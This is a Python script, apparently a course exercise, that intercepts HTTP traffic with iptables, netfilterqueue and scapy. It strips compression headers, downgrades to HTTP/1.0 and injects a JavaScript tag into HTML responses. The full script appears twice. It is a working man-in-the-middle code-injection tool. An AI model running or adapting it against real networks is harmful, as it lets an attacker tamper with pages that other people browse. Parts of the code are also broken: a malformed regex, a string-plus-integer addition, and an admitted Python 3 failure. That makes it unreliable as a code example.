#!/usr/bin/env python

#doesn't actually work in python3 currently, errors about str being returned instead of bytes-like object

import netfilterqueue
import re
import scapy.all as scapy
import subprocess

def print_request(scapy_packet):
    print("===================================")
    print("[+] HTTP Request outbound found")
    print("===================================")
    print(scapy_packet.show())

def print_response(scapy_packet):
    print("===================================")
    print("[+] HTTP Response Inbound found:")
    print("===================================")
    print(scapy_packet.show())

def set_iptables(): #automate setting IPtables for testing on localhost
    print("\n[+] Setting up IPTables\n")
    #subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
    #for setting up FORWARD chain for use on another computer
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    #for setting OUTPUT and INPUT chain for testing on localhost
    
def restore_iptables():
    print("\n[+] Flushing IPTables\n")
    subprocess.call(["iptables", "--flush"])
    
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet
    
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print_request(scapy_packet)
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            #this will match the entire string Accept-Encoding that appears in the Raw layer
            #and replace it with an empty string; this causes the browser to tell the server
            #it doesn't take any form of encoding, and the server will deliver the plaintext
            #web code
            #regex to find and replace field that specifies encoding types accepted
            #replace with "" - empty string
            #print(scapy_packet.show())
            load = load.replace("HTTP/1.1", "HTTP/1.0")
            #HTTP 1.1 sends data in chunks, which breaks the content-length replacement
            #downgrading to HTTP 1.0
        elif scapy_packet[scapy.TCP].sport == 80: #if this exists, packet is HTTP response inbound
            print_response(scapy_packet)
            injection_code = "<script>alert('JS injection');</script>"
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("?:Content-Length:\s)(\d*)", load)
            #separate regex into two groups using () brackets
            #first group is a non-capturing group; ?:
            if content_length_search and "text/html" in load: #if content_length_search is returned and;
                #text/html is in the header of the page
                content_length = content_length_search.group(1) #second element of regex is the number
                #print(content_length)
                new_content_length = int(content_length + len(injection_code))
                load = load.replace(content_length, str(new_content_length))
                print(new_content_length)
                
            #this wont work on pages that specify Content-Length headers;
            #need to add code that will modify the content length value
            #new var created called content_length_search
            #uses re to match pattern: "Content-Length: somenumber
            
            
            #replace is a Python method to replace
            #a string with something else
            #print(scapy_packet.show())
            
            
            #want to first show the packet contents to see what fields to modify
            #using this you see that the Raw layer contains following:
            #Accept-Encoding: gzip, deflate
            #HTML is compressed with gzip then sent to client from server
            
        if load != scapy_packet[scapy.Raw].load: #if load var has changed
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))
        

    packet.accept() #forward packets to target, connectivity seems normal
    
set_iptables()

try:
    while True:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet) #0 is the queue-num used when setting up IPTables in set_iptables
        queue.run()
except KeyboardInterrupt:
    print("\n[+] Stopping file download interceptor")
    restore_iptables()


    

#commented code below
#====================
    
#!/usr/bin/env python

#doesn't actually work in python3 currently, errors about str being returned instead of bytes-like object

import netfilterqueue
import re
import scapy.all as scapy
import subprocess

def print_request(scapy_packet):
    print("===================================")
    print("[+] HTTP Request outbound found")
    print("===================================")
    print(scapy_packet.show())

def print_response(scapy_packet):
    print("===================================")
    print("[+] HTTP Response Inbound found:")
    print("===================================")
    print(scapy_packet.show())

def set_iptables(): #automate setting IPtables for testing on localhost
    print("\n[+] Setting up IPTables\n")
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    
def restore_iptables():
    print("\n[+] Flushing IPTables\n")
    subprocess.call(["iptables", "--flush"])
    
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet
    
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print_request(scapy_packet)
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            #this will match the entire string Accept-Encoding that appears in the Raw layer
            #and replace it with an empty string; this causes the browser to tell the server
            #it doesn't take any form of encoding, and the server will deliver the plaintext
            #web code
            #regex to find and replace field that specifies encoding types accepted
            #replace with "" - empty string
            #print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80: #if this exists, packet is HTTP response inbound
            print_response(scapy_packet)
            injection_code = "<script>alert('JS injection');</script>"
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("?:Content-Length:\s)(\d*)", load)
            #separate regex into two groups using () brackets
            #first group is a non-capturing group; ?:
            if content_length_search and "text/html" in load: #if content_length_search is returned and;
                #text/html is in the header of the page
                content_length = content_length_search.group(1) #second element of regex is the number
                #print(content_length)
                new_content_length = int(content_length + len(injection_code))
                load = load.replace(content_length, str(new_content_length))
                print(new_content_length)
                
            #this wont work on pages that specify Content-Length headers;
            #need to add code that will modify the content length value
            #new var created called content_length_search
            #uses re to match pattern: "Content-Length: somenumber
            
            
            #replace is a Python method to replace
            #a string with something else
            #print(scapy_packet.show())
            
            
            #want to first show the packet contents to see what fields to modify
            #using this you see that the Raw layer contains following:
            #Accept-Encoding: gzip, deflate
            #HTML is compressed with gzip then sent to client from server
            
        if load != scapy_packet[scapy.Raw].load: #if load var has changed
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))
        

    packet.accept() #forward packets to target, connectivity seems normal
    
set_iptables()

try:
    while True:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
except KeyboardInterrupt:
    print("\n[+] Stopping file download interceptor")
    restore_iptables()
